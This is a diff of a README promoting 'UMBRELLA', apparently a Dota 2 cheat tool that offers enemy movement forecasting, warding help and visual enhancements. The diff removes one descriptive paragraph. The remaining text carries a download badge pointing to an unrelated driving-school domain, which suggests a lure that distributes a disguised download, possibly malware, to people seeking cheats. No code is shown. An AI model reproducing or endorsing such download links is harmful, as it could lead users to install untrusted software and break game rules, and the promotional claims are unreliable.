@@ -2,7 +2,6 @@
 
 **UMBRELLA** is a professional soft designed for players who demand high-level map control, smarter warding, and deep tactical insight in every Dota 2 match. Whether you're a core, support, or coach — UMBRELLA delivers real-time decision support, predictive awareness tools, and intelligent visual enhancements that give you a massive edge in competitive and ranked environments.
 
-This project was created to remove uncertainty during gameplay. From enemy movement forecasting to dynamic camera focus, UMBRELLA acts as your in-game tactical assistant, helping you process information, place vision optimally, track cooldowns, and respond instantly — all without distracting from your focus on execution.
 
 [![Download UMBRELLA](https://img.shields.io/badge/Download-UMBRELLA-blueviolet)](https://dalahdrivingschool.com/)
 
